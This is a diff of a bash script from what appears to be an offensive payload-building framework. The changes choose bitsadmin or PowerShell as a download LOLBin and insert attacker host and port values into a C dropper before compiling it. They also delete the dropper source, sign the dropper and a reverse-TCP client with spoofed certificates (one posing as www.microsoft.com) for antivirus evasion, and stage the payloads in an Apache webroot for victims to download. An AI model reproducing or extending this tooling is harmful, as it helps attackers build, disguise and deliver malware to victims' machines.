@@ -13445,7 +13445,7 @@ if [ -z "$lport" ]; then lport="443";fi
 if [ -z "$rpath" ]; then rpath="%tmp%";fi
 if [ -z "$Drop" ]; then Drop="$FullName";fi
 wvd=$(echo $rpath|sed "s|^[%]|\$env:|"|sed "s|%||")
-
+if [ "$easter_egg" = "ON" ]; then Lol="bitsadmin";else Lol="Powershell";fi
 
 ## Display final settings to user.
 echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};sleep 2
@@ -13453,7 +13453,7 @@ echo ${BlueF}"---"
 cat << !
     LPORT    : $lport
     LHOST    : $lhost
-    LOLBin   : Powershell (DownloadFile)
+    LOLBin   : $Lol (DownloadFile)
     DROPPER  : $IPATH/output/$Drop.exe
     PDFdoc   : $IPATH/output/$Drop.pdf
     AGENT    : $IPATH/output/Client.exe
@@ -13475,14 +13475,14 @@ sed -i "s|LhOsT|$lhost|g" dropper.c
 sed -i "s|LpOrT|$lport|g" dropper.c
 sed -i "s|FiLNaMe|$Drop|g" dropper.c
 sed -i "s|TempDir|$rpath|g" dropper.c
-sed -i "s|FiNaL|$wvd|g" dropper.c
+if [ "$easter_egg" = "ON" ]; then sed -i "s|FiNaL|$wvd|g" dropper.c;fi
 
 
 ## COMPILING C Program USING mingw32 OR mingw-W64
 echo "${BlueF}[☠]${white} Compiling dropper using mingw32."${Reset};sleep 2
 # special thanks to astr0baby for mingw32 -mwindows -lws2_32 flag :D
 $ComP dropper.c -o $Drop.exe -lws2_32 -mwindows
-#rm $IPATH/output/dropper.c > /dev/nul 2>&1
+rm $IPATH/output/dropper.c > /dev/nul 2>&1
 
 
 ## Use resourceHacker (wine32) to change the dropper.exe icon
@@ -13527,9 +13527,9 @@ if [ "$easter_egg" = "ON" ]; then
    echo "${BlueF}[${YellowF}i${BlueF}]${white} spoofed certificate:${YellowF} $SSL_domain"${Reset};sleep 2
    cd $IPATH/obfuscate
    cp $IPATH/bin/Client.exe $IPATH/output/Client.exe
-   xterm -T "CarbonCopy - Signs an Executable for AV Evasion" -geometry 110x23 -e "python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/$Drop.exe $IPATH/output/signed-$Drop.exe && sleep 2 && echo "" && python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/Client.exe $IPATH/output/signed-Client.exe && sleep 2"
-   mv $IPATH/output/signed-Client.exe $IPATH/output/Client.exe
+   xterm -T "CarbonCopy - Signs an Executable for AV Evasion" -geometry 110x23 -e "python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/$Drop.exe $IPATH/output/signed-$Drop.exe && sleep 2 && python3 CarbonCopy.py www.microsoft.com 443 $IPATH/output/Client.exe $IPATH/output/signed-Client.exe && sleep 2"
    mv $IPATH/output/signed-$Drop.exe $IPATH/output/$Drop.exe
+   mv $IPATH/output/signed-Client.exe $IPATH/output/Client.exe
    rm -r certs > /dev/nul 2>&1
    chmod +x $IPATH/output/Client.exe > /dev/nul 2>&1
    chmod +x $IPATH/output/$Drop.exe > /dev/nul 2>&1
@@ -13559,16 +13559,16 @@ fi
 cd $IPATH/output
 echo "${BlueF}[☠]${white} Porting required files to apache2 webroot."${Reset};sleep 2
 if [ "$easter_egg" = "ON" ]; then
-   zip Client.zip Client.exe > /dev/nul 2>&1 # ZIP Client.exe # <-- TODO: check if it works
-   mv Client.zip $ApAcHe/Client.zip > /dev/nul 2>&1 # rev tcp Client shell # <-- TODO: check if it works
+   zip Client.zip Client.exe > /dev/nul 2>&1 # ZIP Client.exe 
+   mv Client.zip $ApAcHe/Client.zip > /dev/nul 2>&1 # rev tcp Client shell 
    mv $IPATH/output/Client.exe $ApAcHe/Client.exe > /dev/nul 2>&1 # rev tcp Client shell
 else
-   cd $IPATH/bin # <-- TODO: check if it works
-   zip Client.zip Client.exe > /dev/nul 2>&1 # ZIP Client.exe # <-- TODO: check if it works
-   mv $IPATH/bin/Client.zip $ApAcHe/Client.zip > /dev/nul 2>&1 # rev tcp Client shell # <-- TODO: check if it works
+   cd $IPATH/bin
+   zip Client.zip Client.exe > /dev/nul 2>&1 # ZIP Client.exe
+   mv $IPATH/bin/Client.zip $ApAcHe/Client.zip > /dev/nul 2>&1 # rev tcp Client shell 
    cp $IPATH/bin/Client.exe $ApAcHe/Client.exe > /dev/nul 2>&1 # rev tcp Client shell
    cp $IPATH/bin/Client.exe $IPATH/output/Client.exe > /dev/nul 2>&1 # rev tcp Client shell
-   cd $IPATH/output # <-- TODO: check if it works
+   cd $IPATH/output
 fi
 cp $IPATH/bin/Server.exe $IPATH/output/Server.exe > /dev/nul 2>&1 # Server
 mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped
